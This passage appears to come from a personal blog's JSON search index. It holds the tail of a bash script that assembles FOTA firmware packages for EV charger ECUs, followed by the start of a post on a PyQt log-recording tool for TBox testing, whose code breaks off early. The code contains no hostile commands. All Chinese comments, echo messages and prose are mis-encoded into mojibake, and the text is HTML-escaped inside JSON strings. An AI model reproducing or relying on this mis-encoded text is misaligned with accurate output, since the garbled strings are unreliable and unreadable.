SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/ad-video = \\&quot;\\&quot;/ad-video = \\&quot;$hmi_tar_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX2-MPU = \\&quot;\\&quot;/TBOX2-MPU = \\&quot;$tbox2_tar_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC1 = \\&quot;\\&quot;/DCDC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC2 = \\&quot;\\&quot;/DCDC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC3 = \\&quot;\\&quot;/DCDC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC4 = \\&quot;\\&quot;/DCDC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC1 = \\&quot;\\&quot;/ACDC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC2 = \\&quot;\\&quot;/ACDC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # å¼€å§‹æ‰“åŒ…å…¨éƒ¨ ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_ALL.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_ALL.log; then echo &quot;æ•æ‰åˆ°ics_fota_ALLæ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_ALL.tar.gz unset latest_dir } # æ‰“åŒ…æ‰€æœ‰ï¼ˆä¸å«HMIå’ŒTBOX2ï¼‰ funPackageALLNoHMITB2(){ echo &quot;å¼€å§‹æ‰“åŒ…å…¨éƒ¨&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†binfilesä¸­çš„.binå’Œtar.gzå’Œ.zipæ‹·è´åˆ°moduleç›®å½• cp ./FotaPackageTool/binfiles/* ./module # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥å…¨éƒ¨ECUç‰ˆæœ¬çš„æ–‡ä»¶å mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC1 = \\&quot;\\&quot;/DCDC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC2 = \\&quot;\\&quot;/DCDC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC3 = \\&quot;\\&quot;/DCDC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC4 = \\&quot;\\&quot;/DCDC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC1 = \\&quot;\\&quot;/ACDC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC2 = \\&quot;\\&quot;/ACDC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # å¼€å§‹æ‰“åŒ…å…¨éƒ¨ ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_ALL_NO_HMI_TB2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_ALL_NO_HMI_TB2.log; then echo &quot;æ•æ‰åˆ°ics_fota_ALLæ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_ALL.tar.gz unset latest_dir } # æ‰“åŒ…æ‰€æœ‰(ä¸å«TBOX2) funPackageALLNOTB2(){ echo &quot;å¼€å§‹æ‰“åŒ…å…¨éƒ¨&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†binfilesä¸­çš„.binå’Œtar.gzå’Œ.zipæ‹·è´åˆ°moduleç›®å½• cp ./FotaPackageTool/binfiles/* ./module # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥å…¨éƒ¨ECUç‰ˆæœ¬çš„æ–‡ä»¶å hmi_tar_file=$(cd ./module &amp;&amp; ls hmi*.tar) mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) tbox2_tar_file=$(cd ./module &amp;&amp; ls TB2*.tar.gz) ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/ad-video = \\&quot;\\&quot;/ad-video = \\&quot;$hmi_tar_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC1 = \\&quot;\\&quot;/DCDC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC2 = \\&quot;\\&quot;/DCDC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC3 = \\&quot;\\&quot;/DCDC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCDC4 = \\&quot;\\&quot;/DCDC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC1 = \\&quot;\\&quot;/ACDC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACDC2 = \\&quot;\\&quot;/ACDC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # å¼€å§‹æ‰“åŒ…å…¨éƒ¨ ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_ALL_NO_TB2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_ALL_NO_TB2.log; then echo &quot;æ•æ‰åˆ°ics_fota_ALLæ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_ALL.tar.gz unset latest_dir } # å…¥å£ funCreateDir echo &quot;è¯·å°†HMIçš„.tar;TBOX1çš„.zip;TBOX2çš„.tar.gz;ACDC,DCDC,HCU,CMU,MCUçš„.hex;BMU,CCU,EMS,SECCçš„.s19ä¸Šä¼ è‡³FotaPackageTool/module_tmpç›®å½•&quot; echo &quot;å¼€å§‹æ‰“åŒ…åmoduleç›®å½•å°†ä¼šè¢«æ¸…ç©ºï¼&quot; echo &quot;è¯·è¾“å…¥ 0:é€€å‡º 1:å¼€å§‹æ‰“åŒ…å…¨éƒ¨ 2.å¼€å§‹æ‰“åŒ…[ä¸å«HMIå’ŒTBOX2] 3.å¼€å§‹æ‰“åŒ…[ä¸å«TBOX2]&quot; read num if [ $num -eq 1 ] then echo &quot;å¼€å§‹æ¸…ç†moduleç›®å½•å’ŒFotaPackageTool/binfilesä¸­è½¬ç›®å½•&quot; rm ./FotaPackageTool/*.log funClearModule funClearBinfiles funClearOldFotaPackage funUpdatePackageTime echo &quot;å¼€å§‹æ‰“åŒ…HMI&quot; funPackageHMI funMoveTar echo &quot;å¼€å§‹æ‰“åŒ…TBOX1&quot; funPackageTBOX1 funMoveBin funMoveZip echo &quot;å¼€å§‹æ‰“åŒ…TBOX2&quot; funClearModule funPackageTBOX2 funMoveTar echo &quot;å¼€å§‹æ‰“åŒ…CCU&quot; funClearModule funPackageCCU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…SECC&quot; funClearModule funPackageSECC funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…HCU&quot; funClearModule funPackageHCU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…ACDCå’ŒDCDC&quot; funClearModule funPackagePM funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…CMU&quot; funClearModule funPackageCMU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…BMS&quot; funClearModule funPackageBMS funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…EMS&quot; funClearModule funPackageEMS funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…å…¨éƒ¨&quot; funClearModule funPackageALL mv /home/admin/ics_fota/FotaPackageTool/*.tar.gz /home/ICS/FTPHOME/ echo &quot;æ‰“åŒ…å®Œæˆ,æ—¥å¿—æ–‡ä»¶åœ¨FotaPackageToolç›®å½•å†…,FOTAåŒ…å·²ç§»åŠ¨è‡³FTPç›®å½•/home/ICS/FTPHOME/&quot; elif [ $num -eq 0 ] then exit elif [ $num -eq 2 ] then echo &quot;å¼€å§‹æ¸…ç†moduleç›®å½•å’ŒFotaPackageTool/binfilesä¸­è½¬ç›®å½•&quot; rm ./FotaPackageTool/*.log funClearModule funClearBinfiles funClearOldFotaPackage funUpdatePackageTime echo &quot;å¼€å§‹æ‰“åŒ…TBOX1&quot; funPackageTBOX1 funMoveBin funMoveZip echo &quot;å¼€å§‹æ‰“åŒ…CCU&quot; funClearModule funPackageCCU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…SECC&quot; funClearModule funPackageSECC funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…HCU&quot; funClearModule funPackageHCU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…ACDCå’ŒDCDC&quot; funClearModule funPackagePM funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…CMU&quot; funClearModule funPackageCMU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…BMS&quot; funClearModule funPackageBMS funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…EMS&quot; funClearModule funPackageEMS funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…å…¨éƒ¨&quot; funClearModule funPackageALLNoHMITB2 mv /home/admin/ics_fota/FotaPackageTool/*.tar.gz /home/ICS/FTPHOME/ echo &quot;æ‰“åŒ…å®Œæˆ,æ—¥å¿—æ–‡ä»¶åœ¨FotaPackageToolç›®å½•å†…,FOTAåŒ…å·²ç§»åŠ¨è‡³FTPç›®å½•/home/ICS/FTPHOME/&quot; elif [ $num -eq 3 ] then echo &quot;å¼€å§‹æ¸…ç†moduleç›®å½•å’ŒFotaPackageTool/binfilesä¸­è½¬ç›®å½•&quot; rm ./FotaPackageTool/*.log funClearModule funClearBinfiles funClearOldFotaPackage funUpdatePackageTime echo &quot;å¼€å§‹æ‰“åŒ…HMI&quot; funPackageHMI funMoveTar echo &quot;å¼€å§‹æ‰“åŒ…TBOX1&quot; funPackageTBOX1 funMoveBin funMoveZip echo &quot;å¼€å§‹æ‰“åŒ…CCU&quot; funClearModule funPackageCCU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…SECC&quot; funClearModule funPackageSECC funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…HCU&quot; funClearModule funPackageHCU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…ACDCå’ŒDCDC&quot; funClearModule funPackagePM funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…CMU&quot; funClearModule funPackageCMU funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…BMS&quot; funClearModule funPackageBMS funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…EMS&quot; funClearModule funPackageEMS funMoveBin echo &quot;å¼€å§‹æ‰“åŒ…å…¨éƒ¨&quot; funClearModule funPackageALLNOTB2 mv /home/admin/ics_fota/FotaPackageTool/*.tar.gz /home/ICS/FTPHOME/ echo &quot;æ‰“åŒ…å®Œæˆ,æ—¥å¿—æ–‡ä»¶åœ¨FotaPackageToolç›®å½•å†…,FOTAåŒ…å·²ç§»åŠ¨è‡³FTPç›®å½•/home/ICS/FTPHOME/&quot; else echo &quot;è¾“å…¥æœ‰è¯¯&quot; fi ","link":"https://hellogu.github.io/post/zi-dong-fota-da-bao-jiao-ben/"},{"title":"ä½¿ç”¨pyqtå¼€å‘ä¸€ä¸ªå·¥ä½œæ•ˆç‡å·¥å…·TBox_Log_Tool","content":"pyqtåœ¨å®é™…å·¥ä½œä¸­çš„åº”ç”¨ ä»¥å¾€æ‰‹å·¥æµ‹è¯•æ—¶çš„ä½æ•ˆç‚¹ æ¯æ‰§è¡Œä¸€æ¡ç”¨ä¾‹éƒ½éœ€è¦æ‰“å¼€ä¸‰ä¸ªCMDçª—å£åˆ†åˆ«è®°å½• adb logã€service logå’Œç›‘çœ‹OCPP logï¼Œæ¯æ¬¡æ‰§è¡Œå®Œä¸€æ¡ç”¨ä¾‹éƒ½éœ€è¦é‡æ–°åœ¨CMDçª—å£è¾“å…¥adbå‘½ä»¤ï¼Œéå¸¸ç¹ç æ¯æ‰§è¡Œä¸€æ¡ç”¨ä¾‹éƒ½éœ€è¦è®°å½•ä»¥å¤ªç½‘æŠ¥æ–‡ï¼Œå¹¶ä¸”åœ¨wiresharkä¸­ç‚¹å‡»å¦å­˜ä»¥å¤ªç½‘æŠ¥æ–‡ æµ‹è¯•è®¾å¤‡åœ¨1Lè½¦é—´ä¸­ï¼Œå†¬å†·å¤çƒ­ï¼Œæµ‹è¯•æ—¶éœ€è¦é¢‘ç¹è¿›å‡ºç©ºè°ƒé—´å»æ“ä½œè®¾å¤‡çš„HMIï¼Œæ’æ‹”è®¾å¤‡çš„SIMå¡ é€šè¿‡è¯¥å·¥å…·ï¼Œæ”¹è¿›äº†ä»¥ä¸Šçš„ä¸‰ä¸ªç‚¹ åªéœ€è¦ç®€å•çš„ç‚¹å‡»å°±å¯ä»¥åŒæ—¶è®°å½•3ç§ log æ”¯æŒå¯¹å¼€å‘æ¿å°„é¢‘æ¨¡å—çš„æ‰“å¼€å’Œå…³é—­ é›†æˆäº†å¼€æºé¡¹ç›®scrcpyï¼Œä½¿æµ‹è¯•äººå‘˜åœ¨ç”µè„‘ä¸Šå®ç°å¯¹å……ç”µæ¡©æ“ä½œç•Œé¢çš„è¿œç¨‹æ§åˆ¶ å¾…ä¼˜åŒ–çš„åŠŸèƒ½(å…¬å¸å€’é—­ï¼Œä¸ç”¨ä¼˜åŒ–äº†ğŸ¤¡) ä½¿ç”¨pythonå¤šçº¿ç¨‹å¯¹adbè®¾å¤‡çš„æ„å¤–æ–­å¼€åšå¤„ç† å·¥å…·æ•ˆæœå±•ç¤ºä¸åŠŸèƒ½è®²è§£ ç¬¬ä¸€è¡Œæ§åˆ¶æµ‹è¯•è®¾å¤‡ï¼ˆTBoxï¼‰çš„è¿æ¥çŠ¶æ€ï¼Œå¦‚è¿æ¥äº†å¤šä¸ªadbè®¾å¤‡ï¼Œå¯åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­é€‰æ‹©TBoxè®¾å¤‡ ç¬¬äºŒè¡Œæ˜¯ç”¨serialåº“æ¥å¯¹TBoxå‘é€æŒ‡å®šçš„ATå‘½ä»¤æ¥å¯ç”¨/ç¦ç”¨å°„é¢‘æ¨¡å—ï¼Œè¾¾åˆ°ä½¿TBoxåœ¨çº¿/ç¦»çº¿çš„æ•ˆæœ ç¬¬äºŒè¡Œçš„â€œè¿æ¥HMIâ€ä½¿ç”¨scrcpyå·¥å…·æ¥å¯¹HMIè¿›è¡ŒæŠ•å±æ“ä½œï¼Œæ–¹ä¾¿æµ‹è¯•äººå‘˜åœ¨ç”µè„‘ä¸Šæ“ä½œå’Œè§‚å¯ŸHMI ç¬¬ä¸‰è¡Œæ—¥å¿—åä¸­ä¸€èˆ¬å¡«å…¥ç”¨ä¾‹ç¼–å·ï¼Œå¦‚æœç”¨ä¾‹å¤šæ¬¡æ‰§è¡Œï¼Œç¨‹åºä¼šè‡ªåŠ¨åœ¨æ–°çš„logæ–‡ä»¶åä¸­åŠ å…¥â€œ_1â€ã€â€œ_2â€ä»¥æ­¤ç±»æ¨ ç¬¬å››è¡Œä½¿ç”¨Tsharkåˆ—å‡ºç”µè„‘ä¸Šæ‰€æœ‰çš„ç½‘å¡ï¼Œå‹¾é€‰â€œå½•åˆ¶ä»¥å¤ªç½‘æŠ¥æ–‡â€åå†ç‚¹å‡»â€œå¼€å§‹å½•åˆ¶â€ä¼šåŒæ­¥è®°å½•wiresharkæŠ¥æ–‡ ç¬¬å››è¡Œçš„â€œå¼¹å‡ºocpplogâ€ç‚¹å‡»åä¼šå¼¹å‡ºocpplogçš„å®æ—¶ç›‘çœ‹çª—å£ ä½¿ç”¨pyinstallerå¯¹ç¨‹åºè¿›è¡Œæ‰“åŒ…åå³å¯ç”Ÿæˆexeå¯æ‰§è¡Œæ–‡ä»¶ å…·ä½“å®ç° import sys import time import os import subprocess import serial as ser import configparser import datetime from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QLineEdit, QVBoxLayout, QHBoxLayout, QComboBox, QMessageBox,QCheckBox class LogRecorder(QWidget): def __init__(self): super().__init__() self.devices = [] self.device = None self.case_name = None self.logcat_process = None self.ocpplog_process = None self.init_ui() def init_ui(self): 